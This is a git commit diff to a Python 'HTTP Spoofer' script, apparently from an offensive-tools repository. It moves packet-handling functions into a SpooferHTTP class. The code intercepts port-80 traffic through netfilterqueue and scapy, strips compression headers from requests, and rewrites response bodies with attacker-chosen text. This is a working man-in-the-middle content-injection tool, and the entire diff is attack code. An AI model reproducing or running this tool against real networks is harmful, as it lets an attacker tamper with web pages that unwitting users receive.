1b572b06562b3a05c94c3d00caf7c3420794e648
Swany75 <juandalmausantandreu@gmail.com>
2025-05-28 14:37:49 +0100

    HTTP Spoofer

--- http_spoofing.py
+++ http_spoofing.py
@@ -9,6 +9,48 @@ from modules.my_utils import show_message
 from modules.exit_handler import setup_signal_handler
 from modules.sys_utils import check_root, setup_nfqueue
 
+### Classes ####################################
+
+class SpooferHTTP:
+
+    def __init__(self, original_text, replace_text):
+        self.original_text = original_text.encode()
+        self.replace_text = replace_text.encode()
+
+
+    def set_load(self, packet, load):
+        packet[scapy.Raw].load = load
+
+        del packet[scapy.IP].len
+        del packet[scapy.IP].chksum
+        del packet[scapy.TCP].chksum
+
+        return packet
+
+    def process_packet(self, packet):
+        scapy_packet = scapy.IP(packet.get_payload())
+
+        try:
+
+            if scapy_packet[scapy.TCP].dport == 80:
+                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
+                new_packet = self.set_load(scapy_packet, modified_load)
+                packet.set_payload(new_packet.build())
+
+            elif scapy_packet[scapy.TCP].sport == 80:
+                # show_message("Respuesta:", "minus")
+                modified_load = scapy_packet[scapy.Raw].load.replace(self.original_text, self.replace_text)
+                modified_load = re.sub(b"Content-Length: \\d+\\r\\n", b"", modified_load)
+                modified_load = re.sub(b"Transfer-Encoding: chunked\\r\\n", b"", modified_load)
+                new_packet = self.set_load(scapy_packet, modified_load)
+                packet.set_payload(new_packet.build())
+                # print(scapy_packet.show())
+
+        except:
+            pass
+
+        packet.accept()
+
 ### Functions #############################################################################################################
 
 def get_arguments():
@@ -19,51 +61,6 @@ def get_arguments():
     options = parser.parse_args()
     return options
 
-def set_load(packet, load):
-    packet[scapy.Raw].load = load
-
-    del packet[scapy.IP].len
-    del packet[scapy.IP].chksum
-    del packet[scapy.TCP].chksum
-
-    print(packet.show())
-
-    return packet
-
-def process_packet(packet):
-    scapy_packet = scapy.IP(packet.get_payload())
-
-    # Ensure packet has TCP layer, otherwise ignore
-    if not scapy_packet.haslayer(scapy.TCP):
-        packet.accept()
-        return
-
-    # Only process HTTP packets (port 80)
-    if scapy_packet[scapy.TCP].dport != 80 and scapy_packet[scapy.TCP].sport != 80:
-        packet.accept()
-        return
-
-    if scapy_packet.haslayer(scapy.Raw):
-        try:
-            if scapy_packet[scapy.TCP].dport == 80:
-                show_message("Solicitud:", "")
-                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
-                new_packet = set_load(scapy_packet, modified_load)
-                packet.set_payload(new_packet.build())
-
-            elif scapy_packet[scapy.TCP].sport == 80:
-                show_message("Respuesta:", "minus")
-                modified_load = scapy_packet[scapy.Raw].load.replace(original_text, replace_text)
-                new_packet = set_load(scapy_packet, modified_load)
-                packet.set_payload(new_packet.build())
-
-            print(scapy_packet.show())
-
-        except Exception as e:
-            show_message("Error:", "error", e)
-
-    packet.accept()
-
 ### Main Code #############################################################################################################
 
 def main():
@@ -73,15 +70,14 @@ def main():
     show_message("Executing: ", "info", "HTTP Spoofer")
     setup_signal_handler()
 
-    global original_text, replace_text
-    original_text = args.text_original.encode()
-    replace_text = args.text_replace.encode()
+    spoofer = SpooferHTTP(args.text_original, args.text_replace)
 
     setup_nfqueue()
 
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
+    # Bind to the instance method with a lambda to pass the packet
+    queue.bind(0, lambda packet: spoofer.process_packet(packet))
     queue.run()
-
+    
 if __name__ == "__main__":
     main()
